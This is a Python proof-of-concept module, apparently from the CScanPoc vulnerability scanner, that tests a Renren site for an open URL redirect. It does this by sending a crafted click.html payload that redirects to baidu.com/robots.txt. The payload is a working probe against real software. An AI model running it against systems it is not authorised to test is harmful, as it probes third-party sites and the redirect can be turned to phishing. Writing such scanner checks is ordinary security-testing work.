# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Renren_0104' # 平台漏洞编号
    name = '人人url跳转' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2014-08-15'  # 漏洞公布时间
    desc = '''模版漏洞描述
   人人url跳转漏洞，攻击者可以通过url跳转将应用程序引导到不安全的第三方区域，从而导致的安全问题。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=7033
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Renren'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd7c7b546-412f-4a97-ae88-bfd4bfe87594' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-20' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            targeturl = "https://www.baidu.com/robots.txt"
            payload = '/ebpn/click.html?aid=1000059935001000001&mc=0%5EC100%5EC1000059935001000001%5EC0%5EC147.315%5EC1%5EC150%5EC1336875416%5EC1000000_292555189%7C1%7C1992-01-01%7C20%7C2%7C0086610100000000%7C400000010011_0086610100000000%7C41%7C0%7C0%7C0086610100000000%5EC100000000093%5EC0%5EC%5EC0%5ECrr_REMAIN_2_100%5EC100001%5EC1401815476635733347&refresh_source=3&refresh_idx=0&engine_type=1&ref=http%3A%2F%2Fwww.renren.com%2Fhome&url='+targeturl 
            url = self.target + payload
            response = requests.get(url)
            if response.status_code==200 and "User-agent: Baiduspider" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
